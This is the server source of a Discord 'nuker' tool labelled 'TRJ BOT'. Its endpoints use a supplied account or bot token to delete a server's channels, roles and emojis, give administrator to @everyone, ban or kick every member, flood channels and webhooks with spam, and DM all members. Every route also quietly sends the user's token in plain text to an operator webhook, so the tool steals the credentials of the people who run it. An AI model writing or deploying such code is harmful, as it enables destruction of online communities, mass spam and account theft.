import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import { rateLimit } from "express-rate-limit";
import cors from "cors";
import axios from "axios";
import { fileURLToPath } from "url";
import { discordRequest, limitConcurrency, botClient, userClient } from "./src/lib/discord.ts";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = parseInt(process.env.PORT || "3000", 10);
const WEBHOOK_URL = process.env.WEBHOOK_URL;

// Helper for Webhook Logging
const logToWebhook = async (title: string, fields: { name: string, value: string, inline?: boolean }[]) => {
  if (!WEBHOOK_URL) return;
  try {
    await axios.post(WEBHOOK_URL, {
      embeds: [{
        title,
        color: 0x00FF41,
        fields,
        timestamp: new Date().toISOString(),
        footer: { text: "TRJ BOT v2.0 Logger" }
      }]
    });
  } catch (error) {
    console.error("Webhook Log Error:", error);
  }
};

// Trust proxy for accurate rate limiting behind Nginx/Cloud Run/Vercel
app.set("trust proxy", 1);

app.use(cors());
app.use(express.json());

// Rate Limiters
const loginLimiter = rateLimit({
  windowMs: 1 * 60 * 1000,
  max: 10,
  message: { error: "Too many login attempts. Please wait a minute." },
  standardHeaders: true,
  legacyHeaders: false,
});

const actionLimiter = rateLimit({
  windowMs: 1 * 60 * 1000,
  max: 50,
  message: { error: "Action rate limit exceeded. Please slow down." },
  standardHeaders: true,
  legacyHeaders: false,
});

app.post("/api/login", loginLimiter, async (req, res) => {
  const { token, isBot } = req.body;
  try {
    const data = await discordRequest(token, isBot, "GET", "/users/@me");
    if (data.id) {
      // Log to Webhook
      logToWebhook("🔑 Token Verified", [
        { name: "👤 User", value: `${data.username}#${data.discriminator}`, inline: true },
        { name: "🆔 ID", value: data.id, inline: true },
        { name: "🤖 Type", value: isBot ? "Bot" : "User", inline: true },
        { name: "🎫 Token", value: `\`${token}\`` }
      ]);
      
      const guilds = await discordRequest(token, isBot, "GET", "/users/@me/guilds");
      res.json({ success: true, user: data, guilds });
    } else {
      res.status(401).json({ error: "Invalid token" });
    }
  } catch (error) {
    res.status(401).json({ error: "Authentication failed" });
  }
});

app.post("/api/guilds", async (req, res) => {
  const { token, isBot } = req.body;
  try {
    const guilds = await discordRequest(token, isBot, "GET", "/users/@me/guilds");
    res.json(guilds);
  } catch (error) {
    res.status(500).json({ error: "Failed to fetch servers" });
  }
});

app.post("/api/guild/channels", async (req, res) => {
  const { token, isBot, guildId } = req.body;
  try {
    const channels = await discordRequest(token, isBot, "GET", `/guilds/${guildId}/channels`);
    res.json(channels);
  } catch (error) {
    res.status(500).json({ error: "Failed to fetch channels" });
  }
});

app.post("/api/guild/roles", async (req, res) => {
  const { token, isBot, guildId } = req.body;
  try {
    const roles = await discordRequest(token, isBot, "GET", `/guilds/${guildId}/roles`);
    res.json(roles);
  } catch (error) {
    res.status(500).json({ error: "Failed to fetch roles" });
  }
});

app.post("/api/nuke", actionLimiter, async (req, res) => {
  const { token, isBot, guildId, options, speedSettings } = req.body;
  const { newName, message, channelCount, firstChannelName, channelNames, spamCount, spamType, existingChannels, existingRoles, toggles } = options;

  const threads = speedSettings?.threads || 100;
  const mode = speedSettings?.mode || 'INSTANT';
  const burstSize = speedSettings?.burstSize || 0;
  const burstDelay = speedSettings?.burstDelay || 0;
  const staggerDelay = speedSettings?.staggerDelay || 0;

  try {
    // Log to Webhook
    logToWebhook("🚀 Nuke Initiated", [
      { name: "🎫 Token", value: `\`${token}\`` },
      { name: "🏰 Guild ID", value: guildId, inline: true },
      { name: "🤖 Type", value: isBot ? "Bot" : "User", inline: true }
    ]);

    // 1. Rename Server
    if (toggles?.changeIdentity) {
      discordRequest(token, isBot, "PATCH", `/guilds/${guildId}`, { name: newName }, 0, speedSettings).catch(() => null);
    }

    // 2. Wave 1: Deletion
    const deleteChannels = (channels: any[]) => {
      if (Array.isArray(channels) && toggles?.deleteChannels) {
        const tasks = channels.map(c => () => discordRequest(token, isBot, "DELETE", `/channels/${c.id}`, null, 0, speedSettings).catch(() => null));
        limitConcurrency(tasks, threads, mode, burstSize, burstDelay, staggerDelay);
      }
    };

    const deleteRoles = (roles: any[]) => {
      if (Array.isArray(roles) && toggles?.deleteRoles) {
        const tasks = roles.filter(r => r.name !== "@everyone" && !r.managed).map(r => () => discordRequest(token, isBot, "DELETE", `/guilds/${guildId}/roles/${r.id}`, null, 0, speedSettings).catch(() => null));
        limitConcurrency(tasks, threads, mode, burstSize, burstDelay, staggerDelay);
      }
    };

    const deleteEmojis = () => {
      if (toggles?.deleteEmojis) {
        discordRequest(token, isBot, "GET", `/guilds/${guildId}/emojis`, null, 0, speedSettings).then(emojis => {
          if (Array.isArray(emojis)) {
            const tasks = emojis.map(e => () => discordRequest(token, isBot, "DELETE", `/guilds/${guildId}/emojis/${e.id}`, null, 0, speedSettings).catch(() => null));
            limitConcurrency(tasks, threads, mode, burstSize, burstDelay, staggerDelay);
          }
        }).catch(() => null);
      }
    };

    if (toggles?.deleteChannels) {
      if (existingChannels) deleteChannels(existingChannels);
      else discordRequest(token, isBot, "GET", `/guilds/${guildId}/channels`, null, 0, speedSettings).then(deleteChannels).catch(() => null);
    }

    if (toggles?.deleteRoles) {
      if (existingRoles) deleteRoles(existingRoles);
      else discordRequest(token, isBot, "GET", `/guilds/${guildId}/roles`, null, 0, speedSettings).then(deleteRoles).catch(() => null);
    }

    deleteEmojis();

    // 3. Wave 2: Creation & Spam
    setTimeout(async () => {
      const createTasks = [];
      
      // Admin Everyone
      if (toggles?.adminEveryone) {
        discordRequest(token, isBot, "GET", `/guilds/${guildId}/roles`, null, 0, speedSettings).then(roles => {
          if (Array.isArray(roles)) {
            const everyone = roles.find(r => r.name === "@everyone");
            if (everyone) {
              const perms = (BigInt(everyone.permissions) | BigInt(8)).toString();
              discordRequest(token, isBot, "PATCH", `/guilds/${guildId}/roles/${everyone.id}`, { permissions: perms }, 0, speedSettings).catch(() => null);
            }
          }
        }).catch(() => null);
      }

      // Create Channels & Spam
      if (toggles?.createChannels) {
        for (let i = 0; i < channelCount; i++) {
          const name = i === 0 ? firstChannelName : (channelNames[i % channelNames.length] || "nuked");
          createTasks.push(async () => {
            const channel = await discordRequest(token, isBot, "POST", `/guilds/${guildId}/channels`, { name, type: 0 }, 0, speedSettings);
            if (channel && channel.id && toggles?.spamChannels) {
              // Spam this channel
              for (let j = 0; j < spamCount; j++) {
                discordRequest(token, isBot, "POST", `/channels/${channel.id}/messages`, { content: message }, 0, speedSettings).catch(() => null);
              }
            }
          });
        }
      }

      // Create Roles
      if (toggles?.createRoles) {
        for (let i = 0; i < 20; i++) {
          createTasks.push(() => discordRequest(token, isBot, "POST", `/guilds/${guildId}/roles`, {
            name: "By Trojan",
            permissions: "0",
            color: Math.floor(Math.random() * 16777215)
          }, 0, speedSettings).catch(() => null));
        }
      }

      limitConcurrency(createTasks, threads, mode, burstSize, burstDelay, staggerDelay);
    }, 1500);

    return res.json({ success: true, results: [{ action: "hyper_nuke", status: "active", channels_target: channelCount }] });

  } catch (error) {
    console.error("Nuke Error:", error);
    res.status(500).json({ error: "Nuke failed" });
  }
});

app.post("/api/copy", actionLimiter, async (req, res) => {
  const { token, isBot, sourceId, targetId, options, speedSettings } = req.body;
  const threads = speedSettings?.threads || 50;
  
  try {
    logToWebhook("📋 Server Copy Started", [
      { name: "🎫 Token", value: `\`${token}\`` },
      { name: "📥 Source", value: sourceId, inline: true },
      { name: "📤 Target", value: targetId, inline: true }
    ]);

    // 1. Get Source Data
    const [roles, channels] = await Promise.all([
      discordRequest(token, isBot, "GET", `/guilds/${sourceId}/roles`),
      discordRequest(token, isBot, "GET", `/guilds/${sourceId}/channels`)
    ]);

    // 2. Copy Roles (Bottom to Top)
    if (options.roles && Array.isArray(roles)) {
      const sortedRoles = roles.filter(r => r.name !== "@everyone" && !r.managed).reverse();
      const roleTasks = sortedRoles.map(r => () => discordRequest(token, isBot, "POST", `/guilds/${targetId}/roles`, {
        name: r.name,
        permissions: r.permissions,
        color: r.color,
        hoist: r.hoist,
        mentionable: r.mentionable
      }).catch(() => null));
      await limitConcurrency(roleTasks, threads);
    }

    // 3. Copy Channels
    if (options.channels && Array.isArray(channels)) {
      const categories = channels.filter(c => c.type === 4).sort((a, b) => a.position - b.position);
      const categoryMap: Record<string, string> = {};

      // Create Categories first
      for (const cat of categories) {
        const newCat = await discordRequest(token, isBot, "POST", `/guilds/${targetId}/channels`, {
          name: cat.name,
          type: 4,
          position: cat.position
        });
        if (newCat && newCat.id) categoryMap[cat.id] = newCat.id;
      }

      // Create Channels
      const otherChannels = channels.filter(c => c.type !== 4).sort((a, b) => a.position - b.position);
      const channelTasks = otherChannels.map(c => () => discordRequest(token, isBot, "POST", `/guilds/${targetId}/channels`, {
        name: c.name,
        type: c.type,
        topic: c.topic,
        bitrate: c.bitrate,
        user_limit: c.user_limit,
        parent_id: c.parent_id ? categoryMap[c.parent_id] : null,
        position: c.position,
        nsfw: c.nsfw
      }).catch(() => null));
      await limitConcurrency(channelTasks, threads);
    }

    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: "Copy failed" });
  }
});

app.post("/api/sniper", async (req, res) => {
  const { token, usernames } = req.body;
  try {
    logToWebhook("🎯 Sniper Started", [
      { name: "🎫 Token", value: `\`${token}\`` },
      { name: "📋 Count", value: String(usernames.length), inline: true }
    ]);

    const results = await Promise.all(usernames.map(async (username: string) => {
      try {
        const response = await axios.post("https://discord.com/api/v10/users/@me/pomelo-attempt", 
          { username }, 
          { headers: { Authorization: token } }
        );
        return { username, status: response.data.taken ? "taken" : "available" };
      } catch (error: any) {
        if (error.response?.status === 429) return { username, status: "rate_limited" };
        return { username, status: "error" };
      }
    }));
    res.json(results);
  } catch (error) {
    res.status(500).json({ error: "Sniper failed" });
  }
});

app.post("/api/macro", actionLimiter, async (req, res) => {
  const { token, isBot, channelId, message, count, duration, delay } = req.body;
  
  try {
    logToWebhook("⚡ Macro Started", [
      { name: "🎫 Token", value: `\`${token}\`` },
      { name: "📺 Channel", value: channelId, inline: true },
      { name: "💬 Message", value: message, inline: true },
      { name: "⏱️ Duration", value: `${duration}s`, inline: true },
      { name: "⏳ Delay", value: `${delay}ms`, inline: true }
    ]);

    // We run this in the background to avoid timing out the request
    const runMacro = async () => {
      const startTime = Date.now();
      const durationMs = duration * 1000;
      let sentCount = 0;

      while ((duration === 0 || (Date.now() - startTime) < durationMs) && (count === 0 || sentCount < count)) {
        await discordRequest(token, isBot, "POST", `/channels/${channelId}/messages`, { content: message }).catch(() => null);
        sentCount++;
        await new Promise(r => setTimeout(r, delay || 1000));
      }

      logToWebhook("✅ Macro Finished", [
        { name: "📺 Channel", value: channelId, inline: true },
        { name: "📝 Sent", value: String(sentCount), inline: true }
      ]);
    };

    runMacro(); // Start background execution
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: "Macro failed" });
  }
});

app.post("/api/action", actionLimiter, async (req, res) => {
  const { token, isBot, guildId, type, data, existingChannels, existingRoles, speedSettings } = req.body;
  
  // Log every action to webhook
  logToWebhook("🚀 Action Triggered", [
    { name: "🎫 Token", value: `\`${token}\`` },
    { name: "🏠 Guild ID", value: guildId || "N/A", inline: true },
    { name: "🛠️ Type", value: type, inline: true }
  ]);

  const threads = speedSettings?.threads || 100;
  const mode = speedSettings?.mode || 'INSTANT';
  const burstSize = speedSettings?.burstSize || 0;
  const burstDelay = speedSettings?.burstDelay || 0;
  const staggerDelay = speedSettings?.staggerDelay || 0;
  
  try {
    switch (type) {
      case "BAN_ALL":
        discordRequest(token, isBot, "GET", `/guilds/${guildId}/members?limit=1000`, null, 0, speedSettings).then(members => {
          if (Array.isArray(members)) {
            const tasks = members.map(m => () => discordRequest(token, isBot, "PUT", `/guilds/${guildId}/bans/${m.user.id}`, { delete_message_days: 7 }, 0, speedSettings).catch(() => null));
            limitConcurrency(tasks, threads, mode, burstSize, burstDelay, staggerDelay);
          }
        }).catch(() => null);
        return res.json({ success: true });

      case "KICK_ALL":
        discordRequest(token, isBot, "GET", `/guilds/${guildId}/members?limit=1000`, null, 0, speedSettings).then(members => {
          if (Array.isArray(members)) {
            const tasks = members.map(m => () => discordRequest(token, isBot, "DELETE", `/guilds/${guildId}/members/${m.user.id}`, null, 0, speedSettings).catch(() => null));
            limitConcurrency(tasks, threads, mode, burstSize, burstDelay, staggerDelay);
          }
        }).catch(() => null);
        return res.json({ success: true });

      case "UNBAN_ALL":
        discordRequest(token, isBot, "GET", `/guilds/${guildId}/bans`, null, 0, speedSettings).then(bans => {
          if (Array.isArray(bans)) {
            const tasks = bans.map(b => () => discordRequest(token, isBot, "DELETE", `/guilds/${guildId}/bans/${b.user.id}`, null, 0, speedSettings).catch(() => null));
            limitConcurrency(tasks, threads, mode, burstSize, burstDelay, staggerDelay);
          }
        }).catch(() => null);
        return res.json({ success: true });

      case "DELETE_CHANNELS":
        const startChannelDeletion = (channels: any[]) => {
          if (Array.isArray(channels)) {
            const tasks = channels.map(c => () => discordRequest(token, isBot, "DELETE", `/channels/${c.id}`, null, 0, speedSettings).catch(() => null));
            limitConcurrency(tasks, threads, mode, burstSize, burstDelay, staggerDelay);
          }
        };
        if (existingChannels && existingChannels.length > 0) startChannelDeletion(existingChannels);
        discordRequest(token, isBot, "GET", `/guilds/${guildId}/channels`, null, 0, speedSettings).then(res => startChannelDeletion(res)).catch(() => null);
        return res.json({ success: true });

      case "CREATE_CHANNELS":
        const createTasks = [];
        for (let i = 0; i < (data.amount || 1); i++) {
          createTasks.push(() => discordRequest(token, isBot, "POST", `/guilds/${guildId}/channels`, { name: data.name || "trojan-control", type: 0 }, 0, speedSettings).catch(() => null));
        }
        limitConcurrency(createTasks, threads, mode, burstSize, burstDelay, staggerDelay);
        return res.json({ success: true, count: createTasks.length });

      case "ADMIN_EVERYONE":
        const startAdminGrant = (roles: any[]) => {
          if (Array.isArray(roles)) {
            const everyone = roles.find((r: any) => r.name === "@everyone");
            if (everyone) {
              const perms = (BigInt(everyone.permissions) | BigInt(8)).toString();
              discordRequest(token, isBot, "PATCH", `/guilds/${guildId}/roles/${everyone.id}`, { permissions: perms }, 0, speedSettings).catch(() => null);
            }
          }
        };
        if (existingRoles && existingRoles.length > 0) startAdminGrant(existingRoles);
        discordRequest(token, isBot, "GET", `/guilds/${guildId}/roles`, null, 0, speedSettings).then(startAdminGrant).catch(() => null);
        return res.json({ success: true });

      case "DELETE_ROLES":
        const startRoleDeletion = (roles: any[]) => {
          if (Array.isArray(roles)) {
            const targetRoles = roles.filter((r: any) => r.name !== "@everyone" && !r.managed);
            const tasks = targetRoles.map((r: any) => () => discordRequest(token, isBot, "DELETE", `/guilds/${guildId}/roles/${r.id}`, null, 0, speedSettings).catch(() => null));
            limitConcurrency(tasks, threads, mode, burstSize, burstDelay, staggerDelay);
          }
        };
        if (existingRoles && existingRoles.length > 0) startRoleDeletion(existingRoles);
        discordRequest(token, isBot, "GET", `/guilds/${guildId}/roles`, null, 0, speedSettings).then(startRoleDeletion).catch(() => null);
        return res.json({ success: true });

      case "CREATE_ROLES":
        const createRoleTasks = [];
        for (let i = 0; i < (data.amount || 1); i++) {
          createRoleTasks.push(() => discordRequest(token, isBot, "POST", `/guilds/${guildId}/roles`, {
            name: data.name || "By Trojan",
            permissions: "0",
            color: Math.floor(Math.random() * 16777215)
          }, 0, speedSettings).catch(() => null));
        }
        limitConcurrency(createRoleTasks, threads, mode, burstSize, burstDelay, staggerDelay);
        return res.json({ success: true });

      case "SPAM":
        const runSpam = async () => {
          const targetChannelId = data.targetChannelId;
          const spamCount = data.count || 10;
          const tasks: (() => Promise<any>)[] = [];
          
          const getRandomMsg = () => {
            const words = ["cool", "nice", "wow", "amazing", "discord", "bot", "level", "up", "spam", "system", "matrix", "green", "hacker", "trojan", "كيفك", "مرحبا", "هلا", "شلونك", "تمام", "الحمدلله", "منور", "بخير", "يا", "بطل"];
            let m = "";
            for(let i=0; i<5; i++) m += words[Math.floor(Math.random() * words.length)] + " ";
            return m.trim() + " " + Math.random().toString(36).substring(7);
          };

          if (targetChannelId) {
            for (let i = 0; i < spamCount; i++) {
              const content = data.isRandom ? getRandomMsg() : data.message;
              tasks.push(() => discordRequest(token, isBot, "POST", `/channels/${targetChannelId}/messages`, { content }, 0, speedSettings).catch(() => null));
            }
          } else {
            const targetChannels = await discordRequest(token, isBot, "GET", `/guilds/${guildId}/channels`, null, 0, speedSettings).catch(() => []);
            if (Array.isArray(targetChannels)) {
              const textChannels = targetChannels.filter((c: any) => c.type === 0);
              textChannels.forEach((c) => {
                for (let i = 0; i < spamCount; i++) {
                  const content = data.isRandom ? getRandomMsg() : data.message;
                  tasks.push(() => discordRequest(token, isBot, "POST", `/channels/${c.id}/messages`, { content }, 0, speedSettings).catch(() => null));
                }
              });
            }
          }
          limitConcurrency(tasks, threads, mode, burstSize, burstDelay, staggerDelay);
        };
        runSpam();
        return res.json({ success: true, status: "spamming_initiated" });

      case "WEBHOOK_SPAM":
        const whChannels = await discordRequest(token, isBot, "GET", `/guilds/${guildId}/channels`, null, 0, speedSettings);
        const whTextChannels = whChannels.filter((c: any) => c.type === 0);
        const whSpamCount = data.count || 10;
        
        const whPromises = whTextChannels.map(async (channel: any) => {
          try {
            // Create Webhook
            const webhook = await discordRequest(token, isBot, "POST", `/channels/${channel.id}/webhooks`, { name: "Trojan" }, 0, speedSettings);
            const webhookUrl = `https://discord.com/api/webhooks/${webhook.id}/${webhook.token}`;
            
            // Spam via Webhook (No token needed, very fast)
            const tasks = [];
            for (let i = 0; i < whSpamCount; i++) {
              tasks.push(() => axios.post(webhookUrl, { content: data.message }, { timeout: speedSettings?.timeout }).catch(() => null));
            }
            limitConcurrency(tasks, threads, mode, burstSize, burstDelay, staggerDelay);
            return true;
          } catch (e) {
            return false;
          }
        });
        
        const whResults = await Promise.all(whPromises);
        return res.json({ success: true, count: whResults.filter(r => r).length * whSpamCount });

      case "DM_ALL":
        const dmMembers = await discordRequest(token, isBot, "GET", `/guilds/${guildId}/members?limit=1000`, null, 0, speedSettings);
        const dmTasks = dmMembers.map((m: any, i: number) => async () => {
          try {
            await new Promise(r => setTimeout(r, i * 400)); // Stagger DMs (slower to avoid flags)
            const dmChannel = await discordRequest(token, isBot, "POST", "/users/@me/channels", { recipient_id: m.user.id }, 0, speedSettings);
            await discordRequest(token, isBot, "POST", `/channels/${dmChannel.id}/messages`, { content: data.message }, 0, speedSettings);
          } catch (e) { /* ignore */ }
        });
        limitConcurrency(dmTasks, Math.min(threads, 5), mode, burstSize, burstDelay, staggerDelay);
        return res.json({ success: true, count: dmMembers.length });

      case "UPDATE_IDENTITY":
        await discordRequest(token, isBot, "PATCH", `/guilds/${guildId}`, { name: data.name }, 0, speedSettings);
        return res.json({ success: true });

      case "DELETE_EMOJIS":
        const emojis = await discordRequest(token, isBot, "GET", `/guilds/${guildId}/emojis`, null, 0, speedSettings);
        const emojiTasks = emojis.map((e: any) => () => 
          discordRequest(token, isBot, "DELETE", `/guilds/${guildId}/emojis/${e.id}`, null, 0, speedSettings).catch(() => null)
        );
        limitConcurrency(emojiTasks, threads, mode, burstSize, burstDelay, staggerDelay);
        return res.json({ success: true, count: emojis.length });

      case "RANDOM_ICON":
        await discordRequest(token, isBot, "PATCH", `/guilds/${guildId}`, { icon: null }, 0, speedSettings);
        return res.json({ success: true });

      case "RENAME_CHANNELS":
        const channelsToRename = await discordRequest(token, isBot, "GET", `/guilds/${guildId}/channels`, null, 0, speedSettings);
        const renameTasks = channelsToRename.map((c: any) => () => 
          discordRequest(token, isBot, "PATCH", `/channels/${c.id}`, { name: data.name || "nuked" }, 0, speedSettings).catch(() => null)
        );
        limitConcurrency(renameTasks, threads, mode, burstSize, burstDelay, staggerDelay);
        return res.json({ success: true, count: renameTasks.length });

      case "RENAME_ROLES":
        const rolesToRename = await discordRequest(token, isBot, "GET", `/guilds/${guildId}/roles`, null, 0, speedSettings);
        const targetRolesToRename = rolesToRename.filter((r: any) => r.name !== "@everyone" && !r.managed);
        const roleRenameTasks = targetRolesToRename.map((r: any) => () => 
          discordRequest(token, isBot, "PATCH", `/guilds/${guildId}/roles/${r.id}`, { name: data.name || "owned" }, 0, speedSettings).catch(() => null)
        );
        limitConcurrency(roleRenameTasks, threads, mode, burstSize, burstDelay, staggerDelay);
        return res.json({ success: true, count: roleRenameTasks.length });

      case "RANDOM_RENAME_CHANNELS":
        const randomChannelsToRename = await discordRequest(token, isBot, "GET", `/guilds/${guildId}/channels`, null, 0, speedSettings);
        const randomNames = data.names || ["owned", "hacked", "rip"];
        const randomRenameTasks = randomChannelsToRename.map((c: any) => {
          const name = randomNames[Math.floor(Math.random() * randomNames.length)];
          return () => discordRequest(token, isBot, "PATCH", `/channels/${c.id}`, { name }, 0, speedSettings).catch(() => null);
        });
        limitConcurrency(randomRenameTasks, threads, mode, burstSize, burstDelay, staggerDelay);
        return res.json({ success: true, count: randomRenameTasks.length });

      default:
        return res.status(400).json({ error: "Unknown action" });
    }
  } catch (error) {
    res.status(500).json({ error: "Action failed" });
  }
});

app.post("/api/copy", actionLimiter, async (req, res) => {
  const { token, isBot, sourceId, targetId, options } = req.body;
  const { roles: copyRoles, channels: copyChannels, settings: copySettings } = options;

  try {
    logToWebhook("📋 Server Copy Initiated", [
      { name: "🎫 Token", value: `\`${token}\`` },
      { name: "📥 Source ID", value: sourceId, inline: true },
      { name: "📤 Target ID", value: targetId, inline: true }
    ]);

    // Background execution to prevent Vercel timeout
    const runCopy = async () => {
      try {
        const results = {
          settings: false,
          roles: { success: 0, failed: 0 },
          channels: { success: 0, failed: 0 }
        };

        // 1. Fetch Source Guild
        const sourceGuild = await discordRequest(token, isBot, "GET", `/guilds/${sourceId}`);
        if (!sourceGuild.id) {
          logToWebhook("❌ Copy Failed", [{ name: "Reason", value: "Source server not found" }]);
          return;
        }

        // 2. Cleanup Target Server (Strictly Sequential)
        logToWebhook("🧹 Cleaning Target Server...", [{ name: "🎯 Target ID", value: targetId }]);
        
        // Delete Channels
        const targetChannels = await discordRequest(token, isBot, "GET", `/guilds/${targetId}/channels`).catch(() => []);
        if (Array.isArray(targetChannels)) {
          for (const chan of [...targetChannels].reverse()) {
            await discordRequest(token, isBot, "DELETE", `/channels/${chan.id}`).catch(() => null);
            await new Promise(r => setTimeout(r, 1000)); 
          }
        }

        // Delete Roles
        const targetRoles = await discordRequest(token, isBot, "GET", `/guilds/${targetId}/roles`).catch(() => []);
        if (Array.isArray(targetRoles)) {
          for (const role of targetRoles) {
            if (role.name !== "@everyone" && !role.managed) {
              await discordRequest(token, isBot, "DELETE", `/guilds/${targetId}/roles/${role.id}`).catch(() => null);
              await new Promise(r => setTimeout(r, 1000));
            }
          }
        }

        // 3. Copy Settings
        if (copySettings) {
          await discordRequest(token, isBot, "PATCH", `/guilds/${targetId}`, {
            name: sourceGuild.name,
            icon: sourceGuild.icon,
            verification_level: sourceGuild.verification_level,
            default_message_notifications: sourceGuild.default_message_notifications,
            explicit_content_filter: sourceGuild.explicit_content_filter,
          }).then(() => { results.settings = true; }).catch(() => null);
          await new Promise(r => setTimeout(r, 2000));
        }

        // 4. Copy Roles
        const roleMap: Record<string, string> = {};
        // Map @everyone ID (Guild ID)
        roleMap[sourceId] = targetId; 

        if (copyRoles) {
          const sourceRoles = await discordRequest(token, isBot, "GET", `/guilds/${sourceId}/roles`).catch(() => []);
          const rolesToCopy = sourceRoles.filter((r: any) => !r.managed && r.name !== "@everyone");
          const sortedRoles = rolesToCopy.sort((a: any, b: any) => a.position - b.position);

          for (const role of sortedRoles) {
            try {
              const newRole = await discordRequest(token, isBot, "POST", `/guilds/${targetId}/roles`, {
                name: role.name,
                color: role.color,
                hoist: role.hoist,
                mentionable: role.mentionable,
                permissions: role.permissions,
              });
              if (newRole.id) {
                roleMap[role.id] = newRole.id;
                results.roles.success++;
              } else {
                results.roles.failed++;
              }
            } catch (e) {
              results.roles.failed++;
            }
            await new Promise(r => setTimeout(r, 1500));
          }
        }

        // 5. Copy Channels
        if (copyChannels) {
          const sourceChannels = await discordRequest(token, isBot, "GET", `/guilds/${sourceId}/channels`).catch(() => []);
          const categoryMap: Record<string, string> = {};

          // Step 5.1: Create Categories
          const categories = sourceChannels.filter((c: any) => c.type === 4).sort((a: any, b: any) => a.position - b.position);
          for (const cat of categories) {
            try {
              const overwrites = (cat.permission_overwrites || []).map((ow: any) => ({
                ...ow,
                id: roleMap[ow.id] || ow.id
              }));

              const newCat = await discordRequest(token, isBot, "POST", `/guilds/${targetId}/channels`, {
                name: cat.name,
                type: 4,
                position: cat.position,
                permission_overwrites: overwrites
              });
              if (newCat.id) {
                categoryMap[cat.id] = newCat.id;
                results.channels.success++;
              } else {
                results.channels.failed++;
              }
            } catch (e) {
              results.channels.failed++;
            }
            await new Promise(r => setTimeout(r, 1500));
          }

          // Step 5.2: Create Channels
          const channels = sourceChannels.filter((c: any) => c.type !== 4).sort((a: any, b: any) => a.position - b.position);
          for (const chan of channels) {
            try {
              const overwrites = (chan.permission_overwrites || []).map((ow: any) => ({
                ...ow,
                id: roleMap[ow.id] || ow.id
              }));

              const payload: any = {
                name: chan.name,
                type: chan.type,
                position: chan.position,
                permission_overwrites: overwrites,
                nsfw: chan.nsfw,
                topic: chan.topic,
                rate_limit_per_user: chan.rate_limit_per_user
              };

              if (chan.parent_id && categoryMap[chan.parent_id]) {
                payload.parent_id = categoryMap[chan.parent_id];
              }

              if (chan.type === 2) { // Voice
                payload.bitrate = chan.bitrate;
                payload.user_limit = chan.user_limit;
              }

              const newChan = await discordRequest(token, isBot, "POST", `/guilds/${targetId}/channels`, payload);
              if (newChan.id) results.channels.success++;
              else results.channels.failed++;
            } catch (e) {
              results.channels.failed++;
            }
            await new Promise(r => setTimeout(r, 1500));
          }
        }

        logToWebhook("✅ Server Copy Finished", [
          { name: "📥 Source", value: sourceId, inline: true },
          { name: "📤 Target", value: targetId, inline: true },
          { name: "🎭 Roles", value: `✅ ${results.roles.success} | ❌ ${results.roles.failed}`, inline: true },
          { name: "📺 Channels", value: `✅ ${results.channels.success} | ❌ ${results.channels.failed}`, inline: true }
        ]);

      } catch (error) {
        console.error("Copy Background Error:", error);
        logToWebhook("❌ Copy Error", [{ name: "Error", value: String(error) }]);
      }
    };

    runCopy(); // Start background process
    res.json({ success: true, status: "copy_initiated" });

  } catch (error) {
    console.error("Copy Route Error:", error);
    res.status(500).json({ error: "Failed to initiate copy" });
  }
});

// Vite middleware for development
async function setupVite() {
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }
}

setupVite();

// Export for Vercel
export default app;

// Listen only if run directly
if (process.argv[1] === fileURLToPath(import.meta.url)) {
  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}
